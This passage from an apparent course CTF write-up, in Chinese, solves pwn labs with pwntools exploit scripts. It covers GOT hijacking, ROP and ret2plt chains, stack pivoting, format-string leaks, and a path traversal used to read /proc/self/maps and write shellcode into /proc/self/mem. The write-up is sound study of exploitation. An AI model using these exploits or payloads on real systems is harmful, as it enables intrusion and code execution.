0x7ffff7e09670 [0x555555558030] __isoc99_scanf@GLIBC_2.7 → 0x555555555060 可以看到Printf的got address是在0x7ffff7de8770，如果是以arr的index來說就是==-5==，所以我們要Hijack的目標就很清楚，printf後面會print出/bin/sh\\x00，那我們就可以讀取printf的地址後return to libc，再用offset回到system $ ldd lab linux-vdso.so.1 (0x00007ffc09506000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f50dc33d000) /lib64/ld-linux-x86-64.so.2 (0x00007f50dc577000) $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep printf 2922: 0000000000060770 204 FUNC GLOBAL DEFAULT 15 printf@@GLIBC_2.2.5 $ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system 1481: 0000000000050d60 45 FUNC WEAK DEFAULT 15 system@@GLIBC_2.2.5 (這是筆電的版本，所以會和exploit的script不太一樣) gef➤ p 0x7ffff7de8770-0x60770+0x50d0 $1 = 0x7ffff7dd8d60 gef➤ x/10gx 0x7ffff7dd8d60 0x7ffff7dd8d60 \u0026lt;__libc_system\u0026gt;: 0x74ff8548fa1e0ff3 0x9066fffffb82e907 0x7ffff7dd8d70 \u0026lt;__libc_system+16\u0026gt;: 0x253d8d4808ec8348 0xfffffb70e8001879 0x7ffff7dd8d80 \u0026lt;__libc_system+32\u0026gt;: 0xc48348c0940fc085 0x001f0fc3c0b60f08 0x7ffff7dd8d90 \u0026lt;realpath_stk\u0026gt;: 0x5441554156415741 0x000898ec81485355 0x7ffff7dd8da0 \u0026lt;realpath_stk+16\u0026gt;: 0x4864082474894800 0x480000002825048b Exploit # from pwn import * # r = process(\u0026#39;./lab\u0026#39;) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10043) idx = b\u0026#39;-5\u0026#39; r.sendlineafter(b\u0026#39;idx: \u0026#39;, idx) printf_addr = int(r.recvline().strip().decode().split(\u0026#39; \u0026#39;)[-1]) system_addr = printf_addr - 0x606f0 + 0x50d70 log.info(f\u0026#39;printf address = {hex(printf_addr)}\u0026#39;) log.info(f\u0026#39;system address = {hex(system_addr)}\u0026#39;) # raw_input() r.sendlineafter(b\u0026#39;val: \u0026#39;, str(system_addr).encode()) r.interactive() HW-Notepad-Stage1 # Flag: flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}\n解題流程與思路 # 這一題是等到助教給出hint才之到大概的方向，我一開始也是有一些初步的方向，不過不知道怎麼把卡住的地方解決，最後也是求助@davidchen學長才知道確切的方法。\n首先，感謝@csotaku 的提示與切入方向，既然知道是path traversal的洞，那就代表某個地方我們可以輸入一些簡單的payload，例如./，而這個地方還必須和讀檔有關係，想到這邊我們的選擇也呼之欲出，洞就在==openfile==的地方，我們輸入的notename會和res.res以及.txt concatenate在一起，，不過這邊有個問題是既然我們要順利讀檔，在說明中就有提到檔案名稱是==flag_user==，而不是flag_user.txt，這樣的話我們就應該要想辦法把.txt bypass掉\n想到這邊我先說我的看法，如果要把.txt bypass掉，一開始是參考飛飛的網站範例中有針對URL based的path traversal類似的情況在payload的最後面加上null byte，所以我想可以用同樣的方式bypass(\\x00)，但是怎樣的沒有成功，另外我還有一個疑問，res.res的部分到底是不是一個path，如果不是，就代表我們也需要把它蓋掉或是用其他方法leak出來之類的；當然如果是path的話就沒差了，但我很常陷入這種沒有必要的迴圈轉不出來，其實現在仔細想想，他一定是一個path，因為他最後也是要和{notename}.txt接在一起，如果他不是path就一定讀不到\n反正後來和@davidchen討論完才大致知道如何寫script，簡單來說，因為path的限制長度是128 bytes，所以res.res + {notename} + .txt基本上長度不會超過128 bytes，如果會的話就會被擠出去，所以我們能夠控制的部分就是notename，雖然我們不知道res.res的長度多少，但我們可以爆破，讓這三者串在一起會大於128 bytes並且沒有被寫入path的部分就是.txt，這樣的話就可以順利讀到flag的內容，具體怎麼做就是一直加上/\nHW-Notepad-Stage2 # Flag: flag{why_d0_y0u_KnoM_tH1s_c0WW@nd!?}\n解題流程與思路 # :::success Special Thanks @cs-otaku For the most of the Inspiration of the WP :::\nRecap 在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下: def read_any_file(file_name): payload = b\u0026#39;../../../../../../\u0026#39; + b\u0026#39;/\u0026#39; * (89 - len(file_name)) + file_name offset = 0 res = \u0026#39;\u0026#39; while(True): ret = dealing_cmd(r, 5, payload, offset=str(offset).encode()) # print(ret, len(ret)) if ret != \u0026#39;Read note failed.\u0026#39; and ret != \u0026#34;Couldn\u0026#39;t open the file.\u0026#34;: res += ret offset += 128 else: log.success(res) break return res ==漏洞發想== 透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下虛擬內存探究 \u0026ndash; 第一篇:C strings \u0026amp; /proc，要做的事情和我們的幾乎一樣，簡單說就是\n/proc/[pid]/mem This file can be used to access the pages of a process\u0026rsquo;s memory through open(2), read(2), and lseek(2). Permission to access this file is governed by a ptrace access mode PTRACE_MODE_ATTACH_FSCREDS check; see ptrace(2).\n/proc/[pid]/maps A file containing the currently mapped memory regions and their access permissions. See mmap(2) for some further information about memory mappings. Permission to access this file is governed by a ptrace access mode PTRACE_MODE_READ_FSCREDS check; see ptrace(2). The format of the file is:\naddress perms offset dev inode pathname 00400000-00452000 r-xp 00000000 08:02 173521 /usr/bin/dbus-daemon 00651000-00652000 r--p 00051000 08:02 173521 /usr/bin/dbus-daemon 00652000-00655000 rw-p 00052000 08:02 173521 /usr/bin/dbus-daemon 00e03000-00e24000 rw-p 00000000 00:00 0 [heap] 00e24000-011f7000 rw-p 00000000 00:00 0 [heap] ... 35b1800000-35b1820000 r-xp 00000000 08:02 135522 /usr/lib64/ld-2.15.so 35b1a1f000-35b1a20000 r--p 0001f000 08:02 135522 /usr/lib64/ld-2.15.so 35b1a20000-35b1a21000 rw-p 00020000 08:02 135522 /usr/lib64/ld-2.15.so 35b1a21000-35b1a22000 rw-p 00000000 00:00 0 35b1c00000-35b1dac000 r-xp 00000000 08:02 135870 /usr/lib64/libc-2.15.so 35b1dac000-35b1fac000 ---p 001ac000 08:02 135870 /usr/lib64/libc-2.15.so 35b1fac000-35b1fb0000 r--p 001ac000 08:02 135870 /usr/lib64/libc-2.15.so 35b1fb0000-35b1fb2000 rw-p 001b0000 08:02 135870 /usr/lib64/libc-2.15.so ... f2c6ff8c000-7f2c7078c000 rw-p 00000000 00:00 0 [stack:986] ... 7fffb2c0d000-7fffb2c2e000 rw-p 00000000 00:00 0 [stack] 7fffb2d48000-7fffb2d49000 r-xp 00000000 00:00 0 [vdso] 從以上訊息我們知道，/proc/[pid]/mem就是實際執行該隻process的memory，而/proc/[pid]/maps就是該隻process的memory mapping，所以關於怎麼利用可以看一下csdn的這篇文章，基本上要做的事情和我們差不多，目標都是去修改/proc/[pid]/mem中的value，不過中間有很多東西需要考慮:\n要寫甚麼shellcode 要寫去哪裡 先看要寫去哪裡 按照前面所說應該是要寫/proc/[pid]/mem，但因為前面有提到他只能被open / read / lseek給access，所以目標應該是找出lseek的offset，並且把噁爛shellcode放進去；另外一個問題是我們不知道要寫到哪裡，所以我們可以利用前面的arbitrary read去看process的mapping為何，如下\n# Read /proc/self/maps to leak Libc Base maps_layout = read_any_file(b\u0026#39;/proc/self/maps\u0026#39;).split(\u0026#39;\\n\u0026#39;) libc_base = int(maps_layout[7][:12], 16) puts_addr = libc_base + libc.symbols[\u0026#39;puts\u0026#39;] log.success(f\u0026#34;Libc Base address: {hex(libc_base)}\u0026#34;) log.success(f\u0026#39;Puts Address: {hex(puts_addr)}\u0026#39;) 這樣的話，我們就知道他位於整個memory layout，以及我們想要置換的puts symbols的位置\n要寫甚麼 前面有提到我們需要寫shellcode進去，以替換puts的行為，所以我們需要寫些甚麼server才能噴flag給我們呢?如下\n# Socket Config int fd = socket(AF_INET, SOCK_STREAM, 0); struct sockaddr_in info; info.sin_family = PF_INET; info.sin_addr.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); info.sin_port = htons(8765); # Connect to Backend connect(fd, (struct sockaddr *)\u0026amp;info, sizeof(info)) # Write 0x8787 to fd struct Command cmd; cmd.cmd = 0x8787; write(fd, \u0026amp;cmd, sizeof(cmd)); # Read the result from fd struct Response res; read(fd, $rsp, sizeof(res); # Write the result from fd to stdout write(1, $rsp, 0x40); 簡單來說，前面需要我們設定socket的config，然後用這個config連線到後端，並且把command置換成0x8787，傳送到後端給的fd，這樣後段就會直接噴flag給我們(準確來說是那個fd)，所以我們要承接fd接到的flag並且送到stdout，大概是這樣，但這一連串的操作其實是助教一開始在課堂中有提示，並且看了@cs-otaku的WP也有提到該步驟才知道，所以如果都不知道以上操作的話要怎麼辦呢?我們可以想辦法把backend的binary讀出來，這樣的話就只能自行把backend的binary讀出來再去分析裡面的奧義\n我是直接用godbolt搭配x86-64 disassembly :::spoiler godbolt Result ::: 不過正如@cs-otaku說的\n寫入content是用write去寫的。所以shellcode裡面不可以出現\\x00這種東西\n所以我也是邊參考disassembly的結果慢慢看中間有沒有\\x00的byte，如果有就要想其他的payload替換掉\nSocket Config 像是這邊我不知道AF_INET所代表的byte是多少就可以直接看godbolt的結果，另外syscall要用哪一個可以參考linux x86-64 syscall，並且根據calling convention把shellcode擺好，切記看完之後要看一下轉換成shellcode看有沒有\\x00的byte，可以用pwntools的asm function或是直接用x86-64 disassembly都可以達到一樣的效果 # int fd = socket(AF_INET, SOCK_STREAM, 0); socket = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov al, 0x29 xor rdi, rdi mov dil, 0x2 xor rsi, rsi mov sil, 0x1 xor rdx, rdx syscall mov r8, rax \u0026#34;\u0026#34;\u0026#34; Connect 這邊主要需要觀察protocol怎麼包，首先我們知道第一個參數是存$rdi，也就是存上一個syscall的return value存起來的$r8，至於$rsi的info address，其內容應該怎麼包含甚麼呢?我們先看一下linux x86-64 syscall中的說明 他所需的是struct sockaddr_in info;，而實際去看看sockaddr_in會發現他的結構如下(csdn post): struct sockaddr_in { short sin_family; //address family u_short sin_port; //16 bit TCP/UDP port number struct in_addr sin_addr; //32 bit IP address char sin_zero[8]; //not use, for align }; 就會對應到底下註解的地方，包含IP / Post / Internet Family之類的，所以我們就可以按照這個structure建構出來，short是2 bytes，而根據前面的byte code會發現AF_INET是\\x0002，也就是兩個bytes，第二個是port也是兩個bytes，8765轉成hex就是0x223d；最後一個是IP address，總共是4 bytes的in_addr structure，如果想詳細了解in_addr的結構可以看MSDN，但具體來說就是把127.0.0.1→7f000001，所以全部貼在一起並且轉成little endian的話就會變成==0x100007f3d220002==，但有一個非常大的問題，如果直接把該值push進到stack並取$rsp放到$rsi的話，整個流程會有太多的\\x00，因此@cs-otaku提供了一個非常有創意的想法，就直接用扣的，反正只要最後放到stack的值是對的就好了 # struct sockaddr_in info; # info.sin_family = AF_INET; # info.sin_addr.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); # info.sin_port = htons(8765); # connect(fd, (struct sockaddr *)\u0026amp;info, sizeof(info)); connect = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov al, 0x2a mov rdi, r8 mov rsi, 0xffffffffffffffff mov r9, 0xfeffff80c2ddfffd sub rsi, r9 push rsi mov rsi, rsp xor rdx, rdx mov dl, 0x10 syscall \u0026#34;\u0026#34;\u0026#34; Write 這一段主要是置換原本不應該出現的command，因為按照原本程式的流程，只會有CMD_Register→0x1 / CMD_Login→0x2 / CMD_GetFolder→0x11 / CMD_NewNote→0x12等這四種，分別會在對應的操作下傳到backend後讓他做對應的操作，現在我們要把cmd.cmd改成0x8787，之後用write把這個command寫到對應的fd中，如同其他command也那樣操作一樣 # struct Command cmd; # cmd.cmd = 0x8787; // #define CMD_Flag 0x8787 # write(fd, \u0026amp;cmd, sizeof(cmd)); write = \u0026#34;\u0026#34;\u0026#34; xor r9, r9 mov r9w, 0x8787 push r9 xor rax, rax mov al, 0x1 mov rdi, r8 mov rsi, rsp xor rdx, rdx mov dl, 0xa4 syscall \u0026#34;\u0026#34;\u0026#34; Read 這一段原本的command應該是read(fd, \u0026amp;res, sizeof(res))，我們會去接res傳回來的結果，所以後面的size應該直接看res他的結構有多大而定，總共是一個uint32_t的code + 256個char，所以是260 bytes，也就是0x104，並且我們把res的地址傳給$rsp # read(fd, $rsp, sizeof(res)); read = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov rdi, r8 mov rsi, rsp xor rdx, rdx mov dx, 0x104 syscall \u0026#34;\u0026#34;\u0026#34; Write 2 Console 現在我們已經取得backend傳回來的response，但前端還沒辦法顯示，所以我們需要寫到stdout # write(1, $rsp, 0x40); write2console = \u0026#34;\u0026#34;\u0026#34; xor rax, rax mov al, 0x1 xor rdi, rdi mov dil, 0x1 mov rsi, rsp xor rdx, rdx mov dl, 0x40 syscall \u0026#34;\u0026#34;\u0026#34; 接著我們就只要透過command 4的write note功能把構建好的shellcode，寫到/proc/self/mem對應的位置就好，也就是置換掉puts原本的操作，讓他再次call到puts的時候就會執行我們的shellcode\nHW-Notepad-Stage3 # 解題流程與思路 # 首先，後端有一個洞，就是在login的write，他的buf仔細和其他有call到write做對比會發現，他並沒有清掉buf的內容，這代表他會完完整整的把裡面的內容送到前端，但為甚麼前面兩題都沒有這個問題呢?因為前端並沒有把buf的內容印出來，所以首要目標是找到一個方法可以leak出內容的shellcode之類的，這樣我們就可以抓到text / libc base address 知道這些事情可以幹嘛呢?check token有一個bof的洞，我們可以利用這個洞來傳送rop，所以需要ret2libc抓到base address之後在蓋rop ROP具體的內容是甚麼呢?有兩種方法可以拿到flag，一個是拿到shell之後setuid(0)，因為backend 有 suid 權限，所以我們才可以用 setuid(0) 以root 執行，然後cat /flag_root；第二種是直接ORW，看flag是啥這樣 Lab-ROP_RW # Flag: flag{ShUsHuSHU}\n解題流程與思路 # 先看這個程式的行為，在main當中，他會打開flag.txt和urandom這兩個file，然後做兩者的XOR，並且回傳urandom的內容給我們，並且有BOF的漏洞存在 :::info flag和secret這兩個變數都是global variable ::: 而check這個function的功能是我們可以輸入一個input，他會和secret做XOR，若結果等於==kyoumokawaii==就把前面加密過的flag再跟kyoumokawaii做XOR並回傳給我們\n思路很簡單: 雖然整隻程式都沒有呼叫到check function，但如果我們拿到secret，又可以進到check，是否可以做一些操作拿到flag 一開始一定會做的事情是把flag加密 $$ cipher= flag \\oplus secret\\ $$ 如果可以進到check function $$ input\\leftarrow kyoumokawaii\\oplus secret $$ $$ output\\leftarrow cipher\\oplus kyoumokawaii=flag\\oplus secret\\oplus kyoumokawaii $$ $$ flag = output\\oplus secret\\oplus kyoumokawaii $$ 此時output, secret都已知，我們反推出flag為何，但重點是要怎麼呼叫到check function?==ROP chain + BOF==\n先利用該隻binary的gadget蓋成我們需要的chain，並且隨便找一個區間是不太會寫入的bss section address check_fn_addr = 0x4017ba bss_section = 0x4c7f00 pop_rdx_rbx_ret = 0x0000000000485e8b mov_qword_ptr_rdi_rdx_ret = 0x00000000004337e3 pop_rdi_ret = 0x00000000004020af ... rop_chain = flat( pop_rdi_ret, bss_section, pop_rdx_rbx_ret, input_1, 0, mov_qword_ptr_rdi_rdx_ret, pop_rdi_ret, bss_section + 0x8, pop_rdx_rbx_ret, input_2, 0, mov_qword_ptr_rdi_rdx_ret, pop_rdi_ret, bss_section, check_fn_addr ) 等到跳到check function後就可以開始接return output，並按照上面的公式回推flag Lab-ROP_Syscall # Flag: flag{www.youtube.com/watch?v=apN1VxXKio4}\n解題流程與思路 # 這一題就和之前寫的Simple PWN - 0x12(Lab - rop++)差不多，一樣是利用蓋ROP chain拿到shell，先看一下checksec\n$ checksec chal [*] \u0026#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_rop_syscall/share/chal\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 要達成這個攻擊需要幾個條件:\n程式本身要有足夠多的gadget -\u0026gt; 最好binary是statically link，如果不是的話要看看有沒有辦法leak出libc base address，再用libc上的gadget PIE沒開 有BOF 這樣的話就可以使用rop chain的方法拿到shell，用rop gadget拿到pop rax ; ret, pop rdi ; ret, pop rsi ; ret, pop rdx ; ret, syscall等gadget，接著利用BOF的方式送過去，然後還要考慮送rop chain之前有多少的垃圾bytes，這個可以直接用動態看 Exploit # from pwn import * # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;10.113.184.121\u0026#39;, 10052) context.arch = \u0026#39;amd64\u0026#39; string_bin_sh = 0x0000000000498027 pop_rax_ret = 0x0000000000450087 pop_rdi_ret = 0x0000000000401f0f pop_rsi_ret = 0x0000000000409f7e pop_rdx_pop_rbx_ret = 0x0000000000485e0b syscall = 0x0000000000401cc4 rop_chain = flat( pop_rax_ret, 0x3b, pop_rdi_ret, string_bin_sh, pop_rsi_ret, 0, pop_rdx_pop_rbx_ret, 0, 0, syscall ) r.recvline() r.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) raw_input() r.sendline(b\u0026#39;a\u0026#39; * 24 + rop_chain) r.interactive() Lab-ret2plt # Flag: flag{__libc_csu_init_1s_P0w3RFu1l!!}\n解題流程與思路 # checksec + file + ROPgadget $ checksec chal [*] \u0026#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) $ file chal chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f7ed984819a3908eff455bfcf87716d0fb298fac, for GNU/Linux 3.2.0, not stripped $ ROPgadget --binary chal ... 0x0000000000401263 : pop rdi ; ret ... 首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去，但是透過ROPgadget的結果，雖然東西非常少，但還是有pop rdi ; ret可以用 還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看 流程: 首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt== pop rdi ret puts got address puts plt 這三行的意思是把puts的got address，透過puts印出來給我們 -\u0026gt; puts(put自己的got address) 有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address # leak puts got address to calculate libc base address puts_addr = u64(r.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) libc_base = puts_addr - libc.symbols[\u0026#39;puts\u0026#39;] libc.address = libc_base system_addr = libc.symbols[\u0026#39;system\u0026#39;] 現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有/bin/sh或是/sh的string，不過我們可以直接用同樣的方法，把字串送進去 # fetch user input -\u0026gt; /bin/sh\\x00 pop_rdi_ret bss_addr gets_plt, 此時他就會像使用者要輸入，並把我們的輸入丟到bss address 另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking== # fetch user input -\u0026gt; system address pop_rdi_ret puts_got gets_plt 此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address 所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system # system(\u0026#39;/bin/sh\\x00\u0026#39;) pop_rdi_ret bss_addr puts_plt Lab-Stack Pivot # Flag: flag{Y0u_know_hoW2L3@k_canAry}\n解題流程與思路 # 這一題助教是預設我們必須要使用stack pivot的技巧拿到flag，不過沒有時間設定seccomp，所以我們自己假裝只能使用read / write / open這三個syscall\nchecksec + file $ checksec chal [*] \u0026#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_stack_pivot/share/chal\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) $ file chal chal: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=26fa8e6daa97baf7a26596ea91af5703dd932327, for GNU/Linux 3.2.0, not stripped 首先可以看到該binary是statically link，所以直覺是利用ROP chain拿到shell，不過仔細看source code會發現BOF的長度顯然不太夠我們蓋成shell，所以需要用到stack pivot的技巧，控制RBP跳到其他的地方繼續寫 找gadget leave_ret = 0x0000000000401cfc pop_rdi_ret = 0x0000000000401832 pop_rsi_ret = 0x000000000040f01e pop_rax_ret = 0x0000000000448d27 pop_rdx_ret = 0x000000000040173f syscall_ret = 0x0000000000448280 這邊的重點是syscall ret這個gadget，其實他不是syscall完之後直接ret，而是在經過一些判斷才會進到ret，這個可以從gdb看出來 gef➤ x/10i 0x448280 0x448280 \u0026lt;read+16\u0026gt;: syscall =\u0026gt; 0x448282 \u0026lt;read+18\u0026gt;: cmp rax,0xfffffffffffff000 0x448288 \u0026lt;read+24\u0026gt;: ja 0x4482e0 \u0026lt;read+112\u0026gt; 0x44828a \u0026lt;read+26\u0026gt;: ret 會這樣的原因是我們在ROPgadget中找不到syscall ; ret的gadget，所以助教提示可以直接從read / write這種function找，這樣syscall完了之後會很快的接到ret，這樣中間的操作才不會太影響我們蓋的rop Construct ROP 首先，我們的流程是 ==main_fn → bss_open → main_fn → bss_open → main_fn → bss_write== 會這樣的原因是我們只能寫入0x60的空間而已，所以把open / read / write分開寫，而寫完且執行完後會再跳原main_fn，這樣才能讓我們再讀取下一段的ROP payload 0. 寫入的bss_addr和main_fn address python bss_addr_open = 0x4c2700 bss_addr_read = 0x4c2800 bss_addr_write = 0x4c2900 main_fn = 0x401ce1 先讓rbp跳到bss_open，然後ret到main_fn，接要放到bss_open的payload trash_payload = b\u0026#39;a\u0026#39;*0x20 r.sendline(trash_payload + p64(bss_addr_open) + p64(main_fn)) 之前的rop chain我們會把RBP一起蓋掉，但現在因為要跳到其他的地方，所以rbp的部分就跳到0x4c2700，然後ret address接main_fn 用gdb跟一下，放完的結果大概是這樣 0x00007ffc884f3670│+0x0000: \u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34; ← $rsp, $rsi 0x00007ffc884f3678│+0x0008: \u0026#34;aaaaaaaaaaaaaaaaaaaaaaaa\u0026#34; 0x00007ffc884f3680│+0x0010: \u0026#34;aaaaaaaaaaaaaaaa\u0026#34; 0x00007ffc884f3688│+0x0018: \u0026#34;aaaaaaaa\u0026#34; 0x00007ffc884f3690│+0x0020: 0x00000000004c2700 → \u0026lt;transmem_list+0\u0026gt; add BYTE PTR [rax], al ← $rbp 0x00007ffc884f3698│+0x0028: 0x0000000000401ce1 → \u0026lt;main+12\u0026gt; lea rax, [rbp-0x20] 當main_fn執行完leave(mov rsp , rbp ; pop rbp ;)的時候，rbp就會指到==0x4c2700==，當我們ret到main_fn時，就可以再次輸入payload放到0x4c2700 觀察main_fn的assembly gef➤ x/10i \u0026amp;main 0x401cd5 \u0026lt;main\u0026gt;: endbr64 0x401cd9 \u0026lt;main+4\u0026gt;: push rbp 0x401cda \u0026lt;main+5\u0026gt;: mov rbp,rsp 0x401cdd \u0026lt;main+8\u0026gt;: sub rsp,0x20 0x401ce1 \u0026lt;main+12\u0026gt;: lea rax,[rbp-0x20] 0x401ce5 \u0026lt;main+16\u0026gt;: mov edx,0x80 0x401cea \u0026lt;main+21\u0026gt;: mov rsi,rax 0x401ced \u0026lt;main+24\u0026gt;: mov edi,0x0 0x401cf2 \u0026lt;main+29\u0026gt;: call 0x448270 \u0026lt;read\u0026gt; 0x401cf7 \u0026lt;main+34\u0026gt;: mov eax,0x0 從以上的code可以看得出來，我們是跳到0x401ce1，所以rbp會張出0x20的空間，也就是==0x4c2700-0x20=0x4c26e0==，然後read到的內容就會放到這邊來 寫入bss_addr_open 我們的目標是達成==fd = open(\u0026quot;/home/chal/flag.txt\u0026quot;, 0);==，具體payload如下 file_addr = b\u0026#39;/home/chal/flag.txt\u0026#39;.ljust(0x20, b\u0026#39;\\x00\u0026#39;) ROP_open = flat( # Open file # fd = open(\u0026#34;/home/chal/flag.txt\u0026#34;, 0); bss_addr_read, pop_rax_ret, 2, pop_rdi_ret, bss_addr_open - 0x20, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_ret, main_fn ) r.sendline(file_addr + ROP_open) 首先原本的0x20就拿來放檔案的位址，不過為甚麼後面還要再接著bss_addr_write呢?就和上面一樣，我們要寫別的rop payload上去，因為原本的位子不夠寫了，所以syscall_ret後接到main_fn，他會讀取我們寫入的rop payload到bss_addr_read的地方 寫入bss_addr_read 我們要達成的目標是==read(fd, buf, 0x30)==，具體payload如下 ROP_read = flat( # Read the file # read(fd, buf, 0x30); bss_addr_write, pop_rax_ret, 0, pop_rdi_ret, 3, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, main_fn ) r.sendline(file_addr + ROP_read) 寫入bss_addr_write 我們要達成的目標是==write(fd, buf, 0x30)==，具體payload如下 ROP_write = flat( # Write the file # write(1, buf, 0x30); bss_addr_write, pop_rax_ret, 1, pop_rdi_ret, 1, pop_rsi_ret, bss_addr_read, pop_rdx_ret, 0x30, syscall_ret, 0 ) r.sendline(file_addr + ROP_write) :::danger 執行的時候如果遇到local端可以run但server爛掉的情況，有可能是raw_input()造成的，可以先註解掉這些東西，如果還是遇到一樣的問題，可以開docker在裡面執行\n$ docker-compose up -d $ docker ps $ docker exec -it {container name} /bin/bash \u0026gt; apt update; apt upgrade -y; apt install curl binutils vim git gdb python3 python3-pip -y \u0026gt; pip install pwntools -y \u0026gt; python3 exp.py :::\nLab-FMT # Flag: flag{www.youtube.com/watch?v=Ci_zad39Uhw}\n解題流程與思路 # 這一題和之前寫過的FMT題目大同小異，不過有加入%s的觀念在裡面，可以先參考PicoCTF - flag leak\n首先題目會讀取/home/chal/flag.txt並寫入到global variable - flag中，所以目標很明確，就是要利用兩次的printf的format string bug讀取到flag，而為甚麼要兩次呢?第一次就是要leak出bss section的base address，或是可以說text section的base address，第二次就是利用該結果實際leak出flag的內容 Leak Global Variable的base address 首先直接用gdb跟一下跑到輸入的時候stack上的殘留值 0x00007fffffffd640│+0x0000: 0x00000000000c0000 ← $rsp 0x00007fffffffd648│+0x0008: 0xffffffff00000008 0x00007fffffffd650│+0x0010: \u0026#34;aaaabbbb\\n\u0026#34; ← $rsi 0x00007fffffffd658│+0x0018: 0x000000000000000a (\u0026#34;\\n\u0026#34;?) 0x00007fffffffd660│+0x0020: 0x0000000000000040 (\u0026#34;@\u0026#34;?) 0x00007fffffffd668│+0x0028: 0x0000000000000010 0x00007fffffffd670│+0x0030: 0x0000000000000000 0x00007fffffffd678│+0x0038: 0x0000000100000000 0x00007fffffffd680│+0x0040: 0x0000000000000002 0x00007fffffffd688│+0x0048: 0x8000000000000006 0x00007fffffffd690│+0x0050: 0x0000000000000000 0x00007fffffffd698│+0x0058: 0x0000000000000000 0x00007fffffffd6a0│+0x0060: 0x0000000000000000 0x00007fffffffd6a8│+0x0068: 0x0000000000000000 0x00007fffffffd6b0│+0x0070: 0x0000000000000000 0x00007fffffffd6b8│+0x0078: 0x0000000000000000 0x00007fffffffd6c0│+0x0080: 0x0000000000000000 0x00007fffffffd6c8│+0x0088: 0x0000000000000000 0x00007fffffffd6d0│+0x0090: 0x0000000000000000 0x00007fffffffd6d8│+0x0098: 0x00007ffff7fe48e0 → \u0026lt;dl_main+0\u0026gt; endbr64 0x00007fffffffd6e0│+0x00a0: 0x000000000000000d (\u0026#34;\\r\u0026#34;?) 0x00007fffffffd6e8│+0x00a8: 0x0000000000000001 0x00007fffffffd6f0│+0x00b0: 0x0000000000000001 0x00007fffffffd6f8│+0x00b8: 0x0000000000000001 0x00007fffffffd700│+0x00c0: 0x0000555555554040 → (bad) 0x00007fffffffd708│+0x00c8: 0x00007ffff7fe283c → \u0026lt;_dl_sysdep_start+1020\u0026gt; mov rax, QWORD PTR [rsp+0x58] 0x00007fffffffd710│+0x00d0: 0x00000000000006f0 0x00007fffffffd718│+0x00d8: 0x00007fffffffdbc9 → 0xb6a8e220a241e577 0x00007fffffffd720│+0x00e0: 0x00007ffff7fc1000 → 0x00010102464c457f 0x00007fffffffd728│+0x00e8: 0x0000010101000000 0x00007fffffffd730│+0x00f0: 0x0000000000000002 0x00007fffffffd738│+0x00f8: 0x000000001f8bfbff 0x00007fffffffd740│+0x0100: 0x00007fffffffdbd9 → 0x000034365f363878 (\u0026#34;x86_64\u0026#34;?) 0x00007fffffffd748│+0x0108: 0x0000000000000064 (\u0026#34;d\u0026#34;?) 0x00007fffffffd750│+0x0110: 0x0000000000001000 0x00007fffffffd758│+0x0118: 0xb6a8e220a241e500 0x00007fffffffd760│+0x0120: 0x0000000000000001 ← $rbp 0x00007fffffffd768│+0x0128: 0x00007ffff7db7d90 → \u0026lt;__libc_start_call_main+128\u0026gt; mov edi, eax 0x00007fffffffd770│+0x0130: 0x0000000000000000 0x00007fffffffd778│+0x0138: 0x00005555555551e9 → \u0026lt;main+0\u0026gt; endbr64 可以看到最後一個數值就是text段的殘留值，而且距離輸入的地方有一點距離(0x138)所以應該不會被蓋到。 接著查看vmmap的分布就可以知道他的offset為多少 [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_fmt_leak/share/chal 0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_fmt_leak/share/chal 0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- 